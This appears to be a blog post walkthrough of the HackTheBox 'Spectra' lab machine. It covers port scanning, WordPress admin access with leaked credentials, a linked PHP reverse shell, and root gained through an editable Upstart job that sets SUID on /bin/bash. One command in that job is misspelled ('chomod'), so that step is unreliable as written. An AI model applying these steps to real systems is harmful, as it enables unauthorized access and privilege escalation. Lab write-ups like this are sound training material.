@@ -1,0 +1,148 @@
+---
+title: "HTB - Spectra WriteUp"
+publishedAt: "2021-07-02"
+summary: "HackTheBox Spectra Walkthrough"
+---
+
+![](https://www.hackthebox.eu/storage/avatars/e679d95b5553a6927d1dc4ffe0885ea8.png)
+
+[Spectra](https://app.hackthebox.eu/machines/Spectra) was an Easy machine
+
+---
+
+## Enumeration
+
+The first thing I try is to check all the port with nmap
+
+```bash
+Nmap scan report for spectra.htb (10.10.10.229)
+Host is up (0.19s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
+| ssh-hostkey:
+|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
+80/tcp   open  http    nginx 1.17.4
+|_http-server-header: nginx/1.17.4
+|_http-title: Site doesn't have a title (text/html).
+3306/tcp open  mysql   MySQL (unauthorized)
+|_ssl-cert: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+|_sslv2: ERROR: Script execution failed (use -d to debug)
+|_tls-alpn: ERROR: Script execution failed (use -d to debug)
+|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
+```
+
+So there is ssh, mysql and http ports open.
+Opening the webpage we get this:
+
+![](/images/blog/spectra/1.png)
+
+The below links dont work, and looking at the source code we see that the links have spectra.htb as the domain name.
+
+![](/images/blog/spectra/2.png)
+
+so we add that in our `/etc/hosts` file
+
+```py:/etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali
+
+10.10.10.229    spectra.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+Now the page renders and we can see that its a WordPress site.
+
+![](/images/blog/spectra/3.png)
+
+We get 2 hidden folders by running GoBuster
+
+```py
+/main                 (Status: 301) [Size: 169] [--> http://10.10.10.229/main/]
+/testing              (Status: 301) [Size: 169] [--> http://10.10.10.229/testing/]
+```
+
+![](/images/blog/spectra/4.png)
+
+Looking at the directory listing of `/testing/` we see a **.save** file
+
+Opening it and looking at the source code we can see the database credentials
+
+But if try to connect to mysql with the creds we found, it doesn't work
+
+SSH doesnt work either :(
+
+---
+
+## FootHold
+
+But on the wordpress site, we see there is a post made by administrator
+
+Trying to log into the wp-login with administrator and the password we have works!
+
+Now that we are inside the wp admin login, we can edit a page in an inactive theme and upload a php reverse shell.
+
+![](/images/blog/spectra/5.png)
+
+I used [this](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) php reverse shell from pentestmonkey and put in my IP.
+
+Then listen on port 1234 and then navigate to the 404 page.
+
+We get a reverse shell!
+
+![](/images/blog/spectra/6.png)
+
+---
+
+## User Flag
+
+Now that we have a shell, I run linpeas on the box.
+
+After going through the huge output of linpeas, there is a autologin passwd file and we can see the password
+
+And trying to ssh into the user Katie with that password works!
+
+we now get the user flag
+
+![](/images/blog/spectra/7.png)
+
+---
+
+## Root Flag
+
+By running `sudo -l` we see that we can run `/sbin/initctl` without the root password.
+
+initctl starts or stops services in the `/etc/init/` folders
+
+If we look into that folder, we find few files that can be edited by us.
+
+we edit the `/etc/init/test.conf` file so that it looks like below
+
+```py:/etc/init/test.conf
+description "Test node.js server"
+author      "katie"
+
+start on filesystem or runlevel [2345]
+stop on shutdown
+
+script
+
+    chomod +s /bin/bash
+
+end script
+```
+
+Now we can run this file with `sudo /sbin/initctl start test`
+
+After the service has started, we just run `/bin/bash -p`
+
+And we have root!
+
+![](/images/blog/spectra/8.png)
+
+### ***Pwned!!!***
